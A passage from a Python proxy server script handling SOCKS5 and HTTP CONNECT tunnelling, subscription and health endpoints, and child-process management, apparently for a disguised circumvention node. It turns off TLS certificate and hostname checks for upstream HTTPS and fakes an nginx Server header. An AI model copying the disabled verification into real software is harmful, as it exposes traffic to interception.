                except wait_again:
                    buf[d] = buf.get(d, b"") + dt
                    continue
                except OSError:
                    return
                if n < len(dt):
                    buf[d] = buf.get(d, b"") + dt[n:]
    except OSError:
        pass
    finally:
        for s in (a, b):
            try:
                s.close()
            except OSError:
                pass


def _auth_ok(hv):
    if not hv.lower().startswith("basic "):
        return False
    try:
        u, p = base64.b64decode(hv[6:].strip()).decode().split(":", 1)
        return _tok_ok(u, CFG["uid"]) and _tok_ok(p, CFG["uid"])
    except Exception:
        return False


def h_s5(cn, _fb):
    try:
        n = _rcv(cn, 1)
        if not n:
            return
        m = _rcv(cn, n[0]) or b""
        if AUTH:
            if 0x02 in m:
                cn.sendall(b"\x05\x02")
                sb = _rcv(cn, 2)
                if not sb or sb[0] != 0x01:
                    return
                un = _rcv(cn, sb[1])
                pl = _rcv(cn, 1)
                if not pl:
                    return
                pw = _rcv(cn, pl[0])
                if (un and pw
                        and _tok_ok(un.decode(errors="replace"), CFG["uid"])
                        and _tok_ok(pw.decode(errors="replace"), CFG["uid"])):
                    cn.sendall(b"\x01\x00")
                else:
                    cn.sendall(b"\x01\x01")
                    return
            else:
                cn.sendall(b"\x05\xff")
                return
        else:
            cn.sendall(b"\x05\x00")
        hd = _rcv(cn, 4)
        if not hd or hd[0] != 0x05 or hd[1] != 0x01:
            cn.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
            return
        at = hd[3]
        if at == 0x01:
            rw = _rcv(cn, 4)
            if not rw:
                return
            ht = socket.inet_ntoa(rw)
        elif at == 0x03:
            ln = _rcv(cn, 1)
            if not ln:
                return
            rw = _rcv(cn, ln[0])
            if not rw:
                return
            ht = rw.decode()
        elif at == 0x04:
            rw = _rcv(cn, 16)
            if not rw:
                return
            ht = socket.inet_ntop(socket.AF_INET6, rw)
        else:
            cn.sendall(b"\x05\x08\x00\x01" + b"\x00" * 6)
            return
        pb = _rcv(cn, 2)
        if not pb:
            return
        pt = struct.unpack(">H", pb)[0]
        try:
            rm = _connect(ht, pt, 10)
            _set_keepalive(rm)
        except OSError:
            cn.sendall(b"\x05\x04\x00\x01" + b"\x00" * 6)
            return
        cn.sendall(b"\x05\x00\x00\x01" + b"\x00" * 6)
        _pp(cn, rm)
    except Exception:
        pass
    finally:
        try:
            cn.close()
        except OSError:
            pass


def h_snd(cn, cd, bd, ct="text/html; charset=utf-8", eh=""):
    st = {200: "OK", 400: "Bad Request", 404: "Not Found", 407: "Proxy Authentication Required",
          500: "Internal Server Error", 502: "Bad Gateway", 503: "Service Unavailable"}.get(cd, "Unknown")
    hr = (f"HTTP/1.1 {cd} {st}\r\nServer: nginx/1.24.0\r\nContent-Type: {ct}\r\nContent-Length: {len(bd)}\r\n"
          "Proxy-Connection: close\r\nConnection: close\r\n")
    if eh:
        hr += eh.strip() + "\r\n"
    hr += "\r\n"
    try:
        cn.sendall(hr.encode("utf-8") + bd)
    except OSError:
        pass


def fwd(cn, md, ul, hl, bd):
    p = urllib.parse.urlparse(ul)
    h = p.hostname or ""
    pt = p.port or (443 if p.scheme == "https" else 80)
    if not h:
        h_snd(cn, 400, b"Bad Request")
        return
    ph = (p.path or "/") + (("?" + p.query) if p.query else "")
    hs = [l for l in hl if ":" in l and l.split(":", 1)[0].strip().lower() not in SKIP_HEADERS]
    if not any(lh.lower().startswith("host:") for lh in hs):
        hs.insert(0, f"Host: {h}")
    hs.append("Connection: close")
    rq = (f"{md} {ph} HTTP/1.1\r\n" + "\r\n".join(hs) + "\r\n\r\n").encode()
    try:
        rm = _connect(h, pt, 10)
        if p.scheme == "https":
            # 上游自签证书场景放宽校验，内网 HTTPS 与测试站才走得通
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            rm = ctx.wrap_socket(rm, server_hostname=h)
        rm.sendall(rq + bd)
        _pp(cn, rm)
    except OSError:
        h_snd(cn, 502, b"Bad Gateway")


def h_ht(cn, fb, proxy_ok=True):
    bf = fb
    try:
        while b"\r\n\r\n" not in bf:
            ck = cn.recv(8192)
            if not ck:
                return
            bf += ck
            if len(bf) > 65536:
                return
    except OSError:
        return
    sp = bf.index(b"\r\n\r\n")
    hd = bf[:sp].decode("utf-8", errors="replace")
    bd = bf[sp + 4:]
    ls = hd.split("\r\n")
    rl, hl = ls[0], ls[1:]
    pa = [l for l in hl if ":" in l and l.split(":", 1)[0].strip().lower() == "proxy-authorization"]
    if len(pa) > 1:
        h_snd(cn, 400, b"Bad Request")
        return
    hs = {l.split(":", 1)[0].strip().lower(): l.split(":", 1)[1].strip() for l in hl if ":" in l}
    ps = rl.split(" ", 2)
    if len(ps) < 2:
        return
    md, tg = ps[0].upper(), ps[1]
    is_proxy = md == "CONNECT" or tg.startswith("http://") or tg.startswith("https://")
    try:
        if is_proxy:
            if not proxy_ok:
                h_snd(cn, 400, b"Bad Request")
                return
            if AUTH and not _auth_ok(hs.get("proxy-authorization", "")):
                h_snd(cn, 407, b"Proxy Authentication Required", "text/plain",
                      eh='Proxy-Authenticate: Basic realm="L"')
                return
            if md == "CONNECT":
                try:
                    if tg.startswith("["):
                        h, _, rest = tg.partition("]")
                        h = h[1:]
                        pss = rest.lstrip(":")
                    else:
                        h, pss = tg.rsplit(":", 1)
                    rm = _connect(h, int(pss), 10)
                    _set_keepalive(rm)
                    cn.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
                    _pp(cn, rm)
                except (OSError, ValueError):
                    h_snd(cn, 502, b"Bad Gateway")
            else:
                fwd(cn, md, tg, hl, bd)
        elif tg.startswith("/"):
            web(cn, tg)
        else:
            h_snd(cn, 400, b"Bad Request")
    finally:
        try:
            cn.close()
        except OSError:
            pass


def _dsp(cn, _ad, proxy_ok=True):
    try:
        cn.settimeout(60)
        _set_keepalive(cn)
        fb = cn.recv(1)
        if not fb:
            cn.close()
            return
        if fb == b"\x05":
            if proxy_ok:
                h_s5(cn, fb)
            else:
                cn.close()
        else:
            h_ht(cn, fb, proxy_ok)
    except Exception:
        try:
            cn.close()
        except OSError:
            pass


def bind_free():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LB, 0))
    p = s.getsockname()[1]
    s.close()
    return p


def busy(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        if os.name != "nt":
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        return False
    except OSError:
        return True
    finally:
        s.close()


def start_tcp(port, label, explicit):
    host = C("BIND_HOST", HOST_DEF)
    pub = Ci("PUBLIC_PORT", 0) or 0
    if pub and port == pub:
        port, host = bind_free(), LB
        log(f"{label}: public {pub} owned by front process, local {host}:{port}")
    elif busy(host, port):
        port, host = bind_free(), LB
        log(f"{label}: original port busy, moved to {host}:{port}", "WARN")
    sv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if os.name != "nt":
        sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sv.bind((host, port))
    except OSError:
        try:
            sv.bind((LB, port))
            host = LB
            log(f"{label}: {HOST_DEF} blocked, using {LB}", "WARN")
        except OSError as e:
            log(f"{label}: bind {port} failed: {e}", "ERROR")
            return 0
    sv.listen(512)
    try:
        (WORK / PORT_NAME).write_text(str(port), encoding="utf-8")
    except OSError:
        pass

    def loop():
        while not STOP.is_set():
            try:
                cn, ad = sv.accept()
            except Exception:
                time.sleep(0.2)
                continue
            try:
                if not _CONN_SEM.acquire(blocking=False):
                    try:
                        cn.close()
                    except OSError:
                        pass
                    continue

                def _run(c):
                    try:
                        _dsp(c, ad, True)
                    finally:
                        _CONN_SEM.release()
                _POOL.submit(_run, cn)
            except Exception:
                try:
                    _CONN_SEM.release()
                except ValueError:
                    pass
                try:
                    cn.close()
                except OSError:
                    pass
    threading.Thread(target=loop, daemon=True).start()
    log(f"{label}: listening {host}:{port} ({'set' if explicit else 'auto'})")
    return port


def api():
    lines = (STATE.get("links") or b"").decode("utf-8", "replace").splitlines()
    core_st = STATE.get("core", "")
    core_err = _tail("core") if (core_st.startswith("exit") or "fail" in core_st) else ""
    return {"node": CFG["node"], "ip": STATE.get("ip", ""), "uptime": int(time.time() - _t0),
            "ports": {"udp": CFG.get("pub_hport") or CFG.get("hport"),
                      "tcp": CFG.get("pub_sport") or CFG.get("sport")},
            "cert": STATE.get("cert", ""), "sni": STATE.get("sni", ""),
            "core": core_st, "core_log": core_err, "aux": STATE.get("aux", ""), "links": lines}


def web(cn, path):
    po, _, qs = path.partition("?")
    query = {}
    if qs:
        for pair in qs.split("&"):
            if not pair:
                continue
            k, _, v = pair.partition("=")
            query[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
    if po == SUB_PATH or (po.rstrip("/") == SUB_PATH.rstrip("/") and SUB_PATH != "/"):
        if _SUB_TOKEN and not _tok_ok(query.get("token"), _SUB_TOKEN):
            h_snd(cn, 404, b"Not Found", "text/plain; charset=utf-8")
            return
        blob = STATE.get("links") or b""
        if not blob:
            h_snd(cn, 503, b"preparing", "text/plain; charset=utf-8")
        else:
            h_snd(cn, 200, base64.b64encode(blob), "text/plain; charset=utf-8")
        return
    if po == HEALTH_PATH:
        h_snd(cn, 200, json.dumps({"status": "ok" if STATE["ready"] else "starting", "pid": os.getpid(),
                                   "uptime": int(time.time() - _t0), "core": STATE["core"],
                                   "aux": STATE["aux"]}).encode(), "application/json; charset=utf-8")
        return
    if po == API_PATH:
        if _API_TOKEN and not _tok_ok(query.get("token"), _API_TOKEN):
            h_snd(cn, 404, b"Not Found", "text/plain; charset=utf-8")
            return
        h_snd(cn, 200, json.dumps(api()).encode(), "application/json; charset=utf-8")
        return
    h_snd(cn, 200 if po in ("/", "/index.html") else 404,
          b"ok" if po in ("/", "/index.html") else b"Not Found", "text/plain; charset=utf-8")


def stop(sig=None, frame=None):
    if STOP.is_set():
        return
    STOP.set()
    try:
        _POOL.shutdown(wait=False, cancel_futures=True)
    except Exception:
        pass
    log("stopping", "WARN")
    with LOCK:
        kids = list(KIDS)
    for p in kids:
        try:
            if hasattr(os, "killpg"):
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            else:
                p.terminate()
        except Exception:
            pass
    time.sleep(1)
    for p in kids:
        try:
            if hasattr(os, "killpg"):
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
            else:
                p.kill()
        except Exception:
            pass
    sys.exit(0)


def cleaner():
    delay = Ci("CLEAN_DELAY", 300)
    while not STOP.is_set():
        try:
            if WORK and WORK.exists():
                now = time.time()
                for p in WORK.glob("*.t"):
                    try:
                        # 在途下载每写一块 mtime 就刷新，600 秒门槛把抢删这条路封掉
                        if now - p.stat().st_mtime < 600:
                            continue
                        p.unlink()
                    except OSError:
                        continue
        except Exception:
            pass
        if STOP.wait(delay):
            break


def banner():
    info = _sysinfo()
    n = len((STATE.get("links") or b"").splitlines())
    log("=" * 48)
    log(f"host={_osrelease()} python={info['python']} cpus={info['cpus']} machine={info['machine']}")
    log(f"udp={CFG.get('pub_hport') or CFG['hport']} tcp={CFG.get('pub_sport') or CFG['sport']} "
        f"port-from={CFG['port_src']} local-tcp={CFG['sport']}")
    log(f"work={WORK} pem={STATE['cert']} sni={STATE['sni']} main={STATE['core']} side={STATE['aux']}")
    if n:
        log(f"profiles ready: {n} (see {SUB_PATH}) ip={STATE['ip']} health={HEALTH_PATH}")
    log("=" * 48)


def prepare():
    _tune_kernel_udp()
    if CFG["core_on"]:
        ensure_cert()
    stale = _prune()
    if stale:
        log(f"pruned {stale} stale cache entries")
    _publish(_endpoint_ip())
    if CFG["core_on"]:
        STATE["core"] = "starting"
        spawn(core_cmd, "core", "core")
    else:
        STATE["core"] = "off"
    if CFG["aux_on"]:
        STATE["aux"] = "starting"
        spawn(aux_cmd, "aux", "aux")
    else:
        STATE["aux"] = "off (not configured)"
    STATE["ready"] = True
    banner()
    threading.Thread(target=cleaner, daemon=True).start()


# Site defaults: 这里填的值优先级低于同名环境变量。
DEFAULTS = {
    "UID": "",
    "DOMAIN": "www.bing.com",
    "CERT_URL": "",
    "KEY_URL": "",
    "PINSHA256": "",
    "PROT": "",
    "HPROT": "",
    "SPROT": "",
    "MON_URL": "",
    "MON_TOKEN": "",
    "NODE_NAME": "",
    "WORK_DIR": "",
    "BIND_HOST": "",
    "PUBLIC_PORT": "",
    "CLEAN_DELAY": "300",
    "SOCKS_AUTH": "1",
    "UDP_ENABLE": "1",
    "MAX_CONN": "512",
    "PP_BUF_HIGH": "524288",
    "PP_IDLE_TIMEOUT": "0",
    "DNS_TTL": "300",
    "DNS_CACHE": "1",
    "QUIC_IDLE": "60s",
    "UDP_IDLE": "60s",
    "HY2_MODE": "",
    "BANDWIDTH_UP": "",
    "BANDWIDTH_DOWN": "",
    "MASQ_TYPE": "proxy",
    "MASQ_URL": "https://www.bing.com/",
    "SUB_TOKEN": "",
    "API_TOKEN": "",
}


def _defaults():
    HARD.update({k: str(v) for k, v in DEFAULTS.items()})


def _apply_runtime():
    """把 DEFAULTS / 环境变量统一刷进那几个模块级对象。

    文件顶部的模块级初始化跑在 _defaults() 之前，直读 os.environ，
    所以只改文件底部 DEFAULTS 时那边是看不到的，必须在这里再刷一遍。
    """
    global AUTH, _SUB_TOKEN, _API_TOKEN, _MAX_W, _BUF_HIGH
    global _DNS_TTL, _DNS_CACHE_ON, _CONN_SEM, _POOL
    AUTH = Ci("SOCKS_AUTH", 1) == 1
    _SUB_TOKEN = C("SUB_TOKEN").strip()
    _API_TOKEN = (C("API_TOKEN") or _SUB_TOKEN).strip()
    _MAX_W = max(32, Ci("MAX_CONN", 128))
    _BUF_HIGH = max(262144, Ci("PP_BUF_HIGH", 1048576))
    try:
        _DNS_TTL = max(1.0, float(C("DNS_TTL") or "300"))
    except ValueError:
        _DNS_TTL = 300.0
    _DNS_CACHE_ON = C("DNS_CACHE") != "0"
    _CONN_SEM = threading.BoundedSemaphore(_MAX_W)
    if getattr(_POOL, "_max_workers", None) != _MAX_W:
        try:
            _POOL.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass
        _POOL = _cf.ThreadPoolExecutor(max_workers=_MAX_W, thread_name_prefix="proxy")


def _osrelease():
    for p in ("/etc/os-release", "/usr/lib/os-release"):
        try:
            for line in Path(p).read_text(encoding="utf-8", errors="ignore").splitlines():
                if line.startswith("PRETTY_NAME="):
                    return line.split("=", 1)[1].strip().strip('"')
        except OSError:
            continue
    return platform.platform()


def _sysinfo():
    try:
        load = round(os.getloadavg()[0], 2)
    except (OSError, AttributeError):
        load = 0.0
    return {"pid": os.getpid(), "python": platform.python_version(),
            "cpus": os.cpu_count() or 1, "machine": platform.machine(), "load": load}


def _prune(max_age=604800):
    now = time.time()
    gone = 0
    keep = {PEM_NAME, KEY_NAME, MAP_NAME, RES_NAME, PORT_NAME, "kmsg", "dmesg"}
    for k in ("cert", "key", "cfg"):
        fp = CFG.get(k)
        if fp:
            keep.add(Path(fp).name)
    try:
        entries = list(WORK.iterdir())
    except OSError:
        return 0
    for fp in entries:
        try:
            if not fp.is_file() or fp.name in keep:
                continue
            if now - fp.stat().st_mtime <= max_age:
                continue
            fp.unlink()
            gone += 1
        except OSError:
            continue
    return gone


def _selftest():
    _defaults()
    _apply_runtime()
    probe = Path(tempfile.gettempdir()) / (FSDIR + "-selftest")
    ok_dir = _try_dir(probe)
    exec_ok = bool(ok_dir) and not _noexec(probe)
    if ok_dir:
        shutil.rmtree(probe, ignore_errors=True)
    checks = (("defaults", len(HARD) >= 15),
              ("endpoints", CORE_URLS["x64"].startswith(_A) and CORE_URLS["arm64"].endswith("arm")),
              ("pem", _FALLBACK_PEM.count("BEGIN CERTIFICATE") == 2 and len(_FALLBACK_PEM) > 900),
              ("ports", ok_port("8080") and not ok_port("70000")),
              ("workdir", ok_dir),
              ("execmount", exec_ok),
              ("bufcap", _BUF_HIGH >= 262144 and _MAX_W >= 32),
              ("ready", callable(globals().get("start_tcp")) and callable(globals().get("_pp"))))
    bad = 0
    for name, good in checks:
        log(f"check {name}: {'ok' if good else 'failed'}", "INFO" if good else "ERROR")
        bad += 0 if good else 1
    log(f"self-test {'passed' if not bad else 'failed'} ({len(checks) - bad}/{len(checks)})")
    return 1 if bad else 0


def _cli():
    args = sys.argv[1:]
    if "--version" in args or "-V" in args:
        print(f"{Path(__file__).name} {__version__}")
        raise SystemExit(0)
    if "--defaults" in args or "-D" in args:
        _defaults()
        for k, v in DEFAULTS.items():
            print(f"{k}={HARD.get(k, '')}")
        raise SystemExit(0)
    if "--help" in args or "-h" in args:
        print(f"usage: {Path(__file__).name} [--version] [--defaults] [--check] [--port N]")
        raise SystemExit(0)
    return "--check" in args


def main():
    global WORK
    if _cli():
        raise SystemExit(_selftest())
    _defaults()
    _apply_runtime()
    for s in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(s, stop)
        except (ValueError, OSError):
            pass
    WORK = resolve_workdir(C("WORK_DIR"))
    mp, src = main_port()
    hport, h_set = sub_port("HPROT", mp)
    sport, s_set = sub_port("SPROT", mp)
    endpoint, token = creds()
    uid = env("UID") or str(HARD.get("UID") or "") or str(uuid.uuid4()) or UID_BAK
    pub = Ci("PUBLIC_PORT", 0) or 0
    CFG.update({"work": WORK, "cert": WORK / PEM_NAME, "key": WORK / KEY_NAME, "cfg": WORK / MAP_NAME,
                "uid": uid, "endpoint": endpoint, "token": token, "sni": "",
                "node": C("NODE_NAME") or NODE_DEF, "port_src": src, "hport": hport, "sport": sport,
                "h_set": h_set, "s_set": s_set})
    CFG["pub_sport"] = sport if s_set else (pub or sport)
    CFG["pub_hport"] = hport if h_set else (pub or hport)
    CFG["core_on"] = bool(arch()) and ok_port(hport) and bool(uid)
    CFG["aux_on"] = bool(endpoint) and bool(token)
    if not CFG["core_on"]:
        log("core disabled: arch or port or uid missing", "WARN")
    if not CFG["aux_on"]:
        log("aux disabled: url or token missing", "WARN")
    log(f"runtime: auth={AUTH} conn={_MAX_W} buf={_BUF_HIGH} dns_ttl={_DNS_TTL:.0f} "
        f"dns_cache={_DNS_CACHE_ON} sub_token={'set' if _SUB_TOKEN else 'off'}")
    want = sport
    sport = start_tcp(sport, "proxy", s_set)
    if sport:
        CFG["sport"] = sport
        if sport != CFG["pub_sport"] and not (pub and want == pub):
            # 端口漂移之后订阅要跟着改，否则客户端拿到的端口指向空气
            CFG["pub_sport"] = sport
            log(f"publish port resync: tcp {sport}", "WARN")
    log(f"app up: tcp {CFG['sport']} ({src}) work {WORK}")
    threading.Thread(target=prepare, daemon=True).start()
    try:
        while not STOP.wait(3600):
            pass
    except KeyboardInterrupt:
        stop()

if __name__ == "__main__":
    main()
